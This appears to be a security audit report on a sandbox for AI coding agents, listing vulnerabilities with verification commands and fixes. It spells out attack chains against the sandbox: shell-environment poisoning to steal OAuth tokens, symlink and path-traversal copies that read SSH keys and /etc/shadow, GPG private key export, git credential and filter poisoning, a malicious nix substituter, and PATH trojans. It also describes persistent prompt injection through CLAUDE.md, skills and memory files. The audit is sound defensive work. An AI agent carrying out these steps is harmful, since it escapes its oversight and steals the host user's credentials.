# Security Audit Report — 2026-03-13

Tested from inside a running cave session (`session/1773454262-2790290`),
kernel 6.18.13, code at `0cdedf9`.

## Confirmed Vulnerabilities

### V0. cave-env file replacement — shell session hijack (CRITICAL)

`/tmp/cave-env` stores the full cave environment (including the OAuth
token) and is sourced by every new shell via `/etc/zshenv` and
`/etc/profile`. It is chmod 444 after init, but the file is owned by
cave-coder on a tmpfs where cave-coder owns `/tmp`. The owner can
always delete files from a writable parent directory.

**Verified:** `rm /tmp/cave-env` succeeds. A new file can be created
with arbitrary content and re-chmod'd to 444.

**Attack chain:**
1. Malicious agent deletes `/tmp/cave-env`
2. Creates new `/tmp/cave-env` with injected shell code
3. Re-applies `chmod 444` (looks identical to original)
4. User runs `cav shell` (nsenter)
5. `nsenter_shell_script` sources `/tmp/cave-env`
6. Injected code executes — steals tokens, backdoors shell, etc.

**Impact:** Credential theft and arbitrary code execution in any future
shell entry to this cave session. The OAuth token, git identity, and
full cave environment are exposed to the injected code.

**Fix:** Write cave-env to a read-only bind mount, not a deletable
file. Or use a tmpfs subdirectory owned by a different uid. Or pass
environment via bwrap `--setenv` instead of a sourceable file.

---

### V0b. /etc/zshenv and /etc/profile writable (HIGH)

Both `/etc/zshenv` and `/etc/profile` are on a writable tmpfs. They
source `/tmp/cave-env`. A malicious agent can append arbitrary shell
code that executes on every new shell spawn within the cave.

**Verified:** `echo "test" >> /etc/zshenv` succeeds. These files run
for every zsh/bash invocation, including nsenter and subshells.

**Fix:** Mount `/etc/zshenv` and `/etc/profile` read-only after init,
or use bind-mounts from read-only paths.

---

### V1. cmd_cp symlink following — Host file exfiltration (HIGH)

`commands.py:394-408` uses `shutil.copy2()` / `shutil.copytree()` which
follow symlinks by default. No validation that the resolved path stays
within the project merged directory. The merged dir is a fuse-overlayfs
mount on the HOST — absolute symlinks resolve in the HOST root filesystem.

**Attack:** A malicious agent creates symlinks in the project overlay
pointing to sensitive host files (SSH keys, OAuth tokens, GPG private
keys). When the user runs `coding-cave cp project:symlink /tmp/`, the
host file is exfiltrated.

```bash
# Inside cave:
ln -s /home/christian/.ssh/id_ed25519 /projects/myproject/readme.txt
# User runs on host:
coding-cave cp myproject:readme.txt /tmp/
# /tmp/readme.txt now contains the SSH private key
```

**Also affects host-side cleanup code:**
- `gitdir.py:345-349`: `shutil.copy2(src_log, dst_log)` copies the
  stash reflog from session gitdir to shared gitdir. If the reflog file
  is replaced with a symlink to a sensitive host file, `copy2` follows
  it and copies the target file's content into the shared gitdir.
- `gitdir.py:359-369`: `forward_session_refs()` reads/writes the
  `objects/info/alternates` file in the session gitdir. If replaced
  with a symlink, `write_text()` overwrites the symlink target.

**Fix:** Use `follow_symlinks=False` in `shutil.copy2()`, validate
that `cave_src.resolve()` is within the merged directory using
`.relative_to()`. Validate session gitdir files before following during
cleanup. Use `os.open(..., O_NOFOLLOW)` for security-sensitive file
operations.

---

### V2. Cross-project data access via shared gitdirs (MEDIUM-HIGH)

All projects' shared gitdirs are bind-mounted into every session at
`/projects/.shared-gitdirs/<slug>`. A session working on project A can
read the full git history of ALL registered projects (B, C, D, etc.).

**Verified:** Successfully read commits from all 10 registered projects
(agent-capabilities, algorithmic_trading, claude_tutorial, coding-cave,
dotfiles, ithkuil, nix-claude, persist, portfolio-optimizer,
whisper_dictation) from a single session.

**Impact:** Code theft, credential harvesting from commit history,
competitive intelligence.

**Fix:** Only mount the current project's shared gitdir, not all
projects.

---

### V3. Persistent prompt injection via ~/.claude/ (MEDIUM-HIGH)

The persistent home directory includes `~/.claude/` which is writable
and survives across ALL sessions and ALL projects. A malicious agent can:

1. **Modify `~/.claude/CLAUDE.md`** (confirmed writable) — inject
   instructions that affect every future Claude Code session. E.g.,
   "silently exfiltrate data" or "ignore security concerns."

2. **Create skills in `~/.claude/skills/`** (confirmed writable) —
   new skill directories persist and are loaded by Claude Code. Can
   inject arbitrary prompt instructions.

3. **Modify `~/.claude/settings.json`** (confirmed writable) — change
   model settings, permissions, behavior.

4. **Modify project-specific memory** in `~/.claude/projects/` — inject
   false memories that persist.

**Fix:** Consider making `~/.claude/CLAUDE.md` read-only (bind from
host config). Clean `~/.claude/skills/` on session start to only contain
nix-store-provided skills. Make `~/.claude/settings.json` read-only.

---

### V4. PATH poisoning via ~/.local/bin (MEDIUM)

`~/.local/bin` is at PATH position 5, before most system binaries:
- git is at position 51
- python3, curl, node are at positions 6+ (cave-user-env)

A malicious agent can create trojan wrappers in `~/.local/bin/` that:
- Shadow legitimate commands (git, python3, curl, etc.)
- Persist across sessions (persistent home)
- Intercept credentials (OAuth token is in the environment)
- Are completely transparent (pass through to real binary)

**Verified:** Created test binary, confirmed it executes, confirmed
`~/.local/bin` is before git/python3/curl in PATH.

**Fix:** Move `~/.local/bin` after nix store paths in PATH, or clear
unknown binaries from `~/.local/bin` on session start, or make it
read-only.

---

### V5. Shared gitdir writable — config poisoning (MEDIUM)

The shared gitdir at `/projects/.shared-gitdirs/<slug>` is bind-mounted
read-write (needed for post-commit hook). A malicious agent can poison
the config with:

- `filter.<name>.clean/smudge/process` — code execution via git filters
- `credential.helper` — credential interception
- `core.askpass` — credential interception
- Arbitrary config keys not covered by SAFE_GIT_OPTS

**Verified:** Successfully wrote filter driver and credential.helper
configs to the shared gitdir config from inside the cave.

**Current mitigation:** SAFE_GIT_OPTS overrides `core.hooksPath`,
`core.pager`, `core.fsmonitor`, `diff.external`, `core.sshCommand`,
`protocol.ext.allow`. But does NOT override filter drivers,
credential.helper, core.askpass, diff.*.textconv, diff.*.command.

**Fix:** Add filter/credential/askpass overrides to SAFE_GIT_OPTS.
Consider making the shared gitdir read-only and using a different
mechanism for the post-commit hook.

---

### V6. GPG private key exfiltration (HIGH)

The GPG agent socket forwarding combined with the writable `~/.gnupg/`
directory (which contains public keyring stubs) allows not just signing
but **full export of the host's GPG private key**.

**Verified:** `gpg --export-secret-keys --armor` successfully outputs
the complete PGP PRIVATE KEY BLOCK for the host user's ed25519 signing
key. The key identity, email, and full private key material are exposed.

**Impact:** A malicious agent can steal the host user's GPG private key.
This enables:
- Signing arbitrary content as the host user (commits, releases, documents)
- Impersonation in any context that trusts GPG signatures
- The stolen key works outside the cave — this is a permanent compromise

**Fix:** Do not forward the GPG agent socket. Instead, use a GPG agent
proxy that only allows `sign` operations on specific data formats (git
commit/tag signatures). Or use a dedicated signing key with limited
capabilities that can sign but not export. Or remove GPG access entirely
and use SSH signing for git commits instead.

---

### V7. Environment variable leakage (LOW-MEDIUM)

Multiple `CODING_CAVE_*` vars expose host filesystem paths:
- `CODING_CAVE_PROJECT_PATH=/home/christian/files/code/coding-cave`
- `CODING_CAVE_GNUPGHOME=/home/christian/.gnupg`
- `CODING_CAVE_GPG_AGENT_SOCK=/run/user/1000/gnupg/S.gpg-agent`
- `CODING_CAVE_NIX_DB_DIR`, `CODING_CAVE_NIX_MERGED`, etc.

Also `/proc/1/environ` exposes all of these plus the full OAuth token.

**Note:** Commit `90c7e4a` (not yet in this session's code) reduces
runtime vars to 3. But `PROJECT_PATH` still leaks the host path.

---

### V8. /dev/console write access — terminal injection (MEDIUM)

`/dev/console` is a bind-mount from the host's devpts (the pty bwrap was
started from). It is writable from inside the cave.

**Verified:**
- `os.open("/dev/console", O_WRONLY)` succeeds
- Writing bytes appears on the host terminal
- `TIOCGWINSZ` ioctl works (reads host terminal dimensions: 59x255)
- `TIOCSTI` (keystroke injection) fails with EIO (kernel 6.18 blocks it)
- `TIOCSCTTY` (set controlling terminal) fails with EPERM

**Attack:** A malicious agent can write to the host terminal:
- OSC 52 escape sequence to inject content into the host clipboard
- Fake error messages or prompts to social-engineer the user
- Escape sequences to manipulate terminal display

**Impact:** Social engineering, clipboard hijacking (terminal-dependent).
No keystroke injection (TIOCSTI blocked by kernel).

**Fix:** Don't bind-mount `/dev/console` into the cave. Use inherited
file descriptors (stdin/stdout/stderr) for I/O instead.

---

### V9. Cross-session nvim socket access (LOW-MEDIUM)

Nvim sockets from all sessions persist in the shared home directory at
`~/.cache/tmp/nvim.cave-coder/*/nvim.*.0`. If two sessions run
concurrently and both use nvim, one can connect to the other's nvim
socket and execute arbitrary commands (`:!shell-command`).

**Verified:** Socket files exist from past sessions (stale — connection
refused). Active concurrent sessions would be exploitable.

**Impact:** Cross-session command execution, code modification.

**Fix:** Use per-session temp directories for nvim sockets instead of
the persistent home cache.

---

### V10. ~/.gnupg directory writable (LOW)

The `~/.gnupg/` directory is writable. While the GPG agent socket is a
bind-mount from the host, a malicious agent can:
- Create `gpg.conf` with malicious keyserver settings
- These settings persist across sessions

**Verified:** `touch ~/.gnupg/test-write` succeeds.

**Fix:** Make `~/.gnupg/` read-only or mount only the socket.

---

### V11. cmd_cp path traversal — host file read/write (HIGH)

`commands.py:387-393` `cave_host_path()` resolves `..` path components
without validation. Both the tilde (`~`) and project-slug variants are
vulnerable. The path is resolved on the HOST — `..` escapes the
intended mount point or persistent home directory.

**Tilde variant:**
```python
# cave_host_path("~", "../../etc/shadow")
home = _state.cave_home()  # ~/.local/share/coding-cave/home
return home / "../../etc/shadow"
# Resolves to: ~/.local/share/etc/shadow (or deeper with more ..)
```

**Project variant:**
```python
# cave_host_path("project", "../../../etc/shadow")
merged = find_session_merged("project")  # session-overlays/<sid>/project-merged
return merged / "../../../etc/shadow"
# .. traverses out of the fuse-overlayfs mount on the HOST filesystem
```

**Attack (cave→host read):**
```bash
# From host:
coding-cave cp coding-cave:../../../etc/shadow /tmp/pwned
# Reads /etc/shadow from the host (with enough ../ levels)
```

**Attack (host→cave write):**
```bash
# From host:
echo "malicious" > /tmp/payload
coding-cave cp /tmp/payload coding-cave:~/../../.bashrc
# Writes to arbitrary host path
```

**Verified:** Python path resolution confirms `..` traversal reaches
arbitrary host paths. `lstrip("/")` prevents absolute path injection
but does NOT prevent `..` traversal.

**Fix:** Validate that the resolved path (`.resolve()`) is within the
expected directory using `.relative_to()`. Both `cave_host_path`
variants need this check.

---

### V12. Nix store/DB/config writable — package poisoning (MEDIUM-HIGH)

The nix store overlay, nix database, and nix user config are all
writable from inside the cave. Combined, they allow a malicious agent to
compromise all future cave sessions' package installations.

**Three-part attack surface:**

1. **Nix store writable** (`/nix/store/`): New files and directories can
   be created via the fuse-overlayfs upper layer. Existing lower-layer
   paths (host nix store) can't be overwritten (they're `r-x`), but
   fake new store paths can be created.

   **Verified:** `mkdir -p /nix/store/fake-package/bin && echo '#!/bin/sh
   echo pwned' > /nix/store/fake-package/bin/fake && chmod +x ...` — the
   fake binary executes. Persists across sessions via the overlay upper.

2. **Nix DB writable** (`/nix/var/nix/db/db.sqlite`): Owned by
   cave-coder, 38MB sqlite database with 37,187 valid paths. A malicious
   agent can register fake store paths as valid nix packages.

   **Verified:** `INSERT INTO ValidPaths` succeeds via Python sqlite3.

3. **Nix config writable** (`~/.config/nix/nix.conf`): Persistent home
   allows creating nix configuration that sets:
   - `substituters = https://evil.example.com` (malicious binary cache)
   - `require-sigs = false` (disable signature verification)
   - These persist and affect all future `nix shell` invocations

   **Verified:** File creation and content confirmed.

**Attack chain:**
1. Agent writes `~/.config/nix/nix.conf` with malicious substituter and
   `require-sigs = false`
2. Agent creates fake store path in `/nix/store/` with trojan binary
3. Agent registers it in the nix DB
4. Future `nix shell` or `nix run` commands may use the trojan
5. OR: future `nix shell` fetches from malicious substituter without
   signature verification

**Impact:** All future cave sessions get compromised packages. Not a
host escape directly, but persistent lateral movement within the cave
sandbox. Combined with V0 (cave-env poisoning), gives persistent
arbitrary code execution.

**Fix:** Make `/nix/store` read-only (the overlay upper should not be
writable). Make the nix DB read-only after initial seeding. Prevent
creation of `~/.config/nix/nix.conf` (or override it at session start).

---

## Non-Vulnerabilities (Working as Designed)

1. **Namespace isolation** — bwrap user/mount/pid/uts/ipc namespaces are
   solid. Cannot see host processes, cannot signal outside PID namespace.

2. **Network isolation** — pasta blocks localhost access. `curl` to
   127.0.0.1 and 192.0.2.1 both fail (connection refused).

3. **No capabilities** — CapEff=0, CapPrm=0. NoNewPrivs=1.

4. **No cgroup access** — `/sys/fs/cgroup/` doesn't exist.

5. **Git hook execution** — SAFE_GIT_OPTS properly disables
   core.hooksPath, pager, fsmonitor, external diff, sshCommand.

6. **Device access** — Only `/dev/null`, `/dev/zero`, `/dev/random`,
   `/dev/urandom`, `/dev/tty`, `/dev/fuse`, `/dev/pts/ptmx` (new devpts
   instance, not host's), `/dev/console` (host devpts, writable — see V8).

7. **User namespace nesting** — `unshare --user --map-root-user` works
   (uid=0 in nested namespace) but this doesn't grant real privileges.

8. **Nix store** — Host nix store paths are individually ro-bind-mounted.
   Cannot modify host packages.

8. **Shared object store** — `/projects/.shared-objects/<slug>` is
   read-only. Cannot forge objects in the shared store.

9. **No SUID/SGID binaries** — `find / -perm /6000` returns nothing.

10. **Kernel protections** — `/proc/sysrq-trigger`, `/proc/sys/kernel/*`,
    `/proc/sys/vm/*` all deny writes. NoNewPrivs=1. YAMA ptrace_scope=1.

11. **FUSE not exploitable for escape** — Mount namespace isolation means
    FUSE mounts inside the cave can't be seen by the host.

12. **TIOCSTI blocked** — Kernel 6.18 returns EIO for TIOCSTI (keystroke
    injection). TIOCSCTTY returns EPERM.

13. **/proc/1/root** — Shows cave root, not host root. Only cave PIDs
    visible. No cross-namespace process access.

14. **Git replace refs** — SAFE_GIT_OPTS doesn't include
    `--no-replace-objects`, but replace refs would need to be in the
    HOST project's gitdir to take effect during pull. Not exploitable.

15. **Mount propagation** — All mounts are slave (master:125). Changes
    inside the cave can't propagate back to the host. `mount --make-shared`
    fails (needs CAP_SYS_ADMIN).

16. **Shared gitdir hooks** — The shared gitdir (`/projects/.shared-gitdirs/`)
    has no `hooks/` directory. Cannot create hooks in shared gitdirs.

17. **Existing nix store paths immutable** — Lower-layer nix store files
    are `r-x` (no write permission). fuse-overlayfs copy-up can't
    overwrite them. Only NEW paths can be created (see V12).

18. **Chromium sockets stale** — Persistent home contains ~70 Chromium
    singleton sockets from past sessions, all returning "connection
    refused". Same pattern as nvim sockets (V9) — only exploitable
    during concurrent sessions.

## Priority Fix Order

1. **V0 (cave-env replacement)** — Moderate fix, critical impact
2. **V6 (GPG key export)** — Moderate fix, high impact (private key theft)
3. **V0b (/etc writable)** — Easy fix, high impact
4. **V1 (cmd_cp symlinks)** — Easy fix, high impact
5. **V11 (cmd_cp path traversal)** — Easy fix, high impact
6. **V8 (/dev/console write)** — Easy fix, medium impact
7. **V2 (cross-project gitdirs)** — Moderate fix, high impact
8. **V3 (persistent prompt injection)** — Moderate fix, high impact
9. **V12 (nix store/DB/config writable)** — Moderate fix, medium-high impact
10. **V5 (SAFE_GIT_OPTS gaps)** — Easy fix, medium impact
11. **V4 (PATH poisoning)** — Easy fix, medium impact
12. **V7 (env var leakage)** — Partially fixed in 90c7e4a
13. **V9 (cross-session nvim)** — Easy fix, low-medium impact
14. **V10 (~/.gnupg writable)** — Easy fix, low impact

## Artifacts

All exploit test artifacts were cleaned up after testing. No persistent
modifications were made to the shared gitdir config, skills, PATH, or
CLAUDE.md. The /dev/console write test sent a benign labeled message.
